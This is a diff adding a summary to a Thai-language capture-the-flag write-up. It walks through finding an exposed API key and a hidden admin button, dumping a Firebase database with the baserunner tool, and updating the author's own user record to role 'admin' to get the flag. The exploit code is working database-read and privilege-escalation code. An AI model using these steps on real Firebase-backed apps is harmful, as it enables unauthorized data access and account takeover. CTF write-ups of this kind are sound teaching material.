@@ -88,3 +88,63 @@ window.db.ref("users/RjVUrCIRDJQmsfmJTnnHLqLDY7m2").update({
 <br>
 ![รูปภาพbaserunnertool](falgsth.png)
 ## สรุป
+ใช้
+`
+``` 
+curl https://minictf2.p7z.pw 
+```
+`
+<br>
+เจอ 
+API key
+![รูปภาพapikey](apikey.png)
+ปุ่มที่ซ่อนอยู่
+![รูปภาพadminbutton](button.png)
+<br>
+ใช้ tool [baserunner](https://www.youtube.com/watch?v=1KPd5gRQbKw)
+<br>
+![รูปภาพbaserunnerui](baserunnerui.png)
+<br>
+จากนั้นค้นหาข้อมูลตัวเอง ด้วย
+
+
+`
+```
+window.db.ref("/").get().then(function(snapshot) {
+  if (snapshot.exists()) {
+    window.displayObject(snapshot);
+  }
+  else {
+    window.displayMessage("No data available");
+  }
+}).catch(function(error) {
+  window.displayError(error);
+});
+```
+`
+<br>
+จาดนั้นก็หาข้อมูล user ตัวเองก็จะได้ `` RjVUrCIRDJQmsfmJTnnHLqLDY7m2 ``
+<br>
+![รูปภาพbaserunnertool](reduser.png)
+<br>
+จากนั้นเราจะเปลี่ยน role: "admin", controlUnlocked: true
+ด้วย <br>
+
+```
+window.db.ref("users/RjVUrCIRDJQmsfmJTnnHLqLDY7m2").update({
+    role: "admin",
+    controlUnlocked: true
+})
+.then(() => {
+    window.displayMessage("🎉 Updated to admin!");
+})
+.catch(error => {
+    window.displayError(`❌ Error: ${error}`);
+});
+
+```
+![รูปภาพbaserunnertool](edit.png)
+<br>
+จากนั้นก็ login เข้าสู่ระบบ เราก็จะได้ flag
+<br>
+![รูปภาพbaserunnertool](falgsth.png)
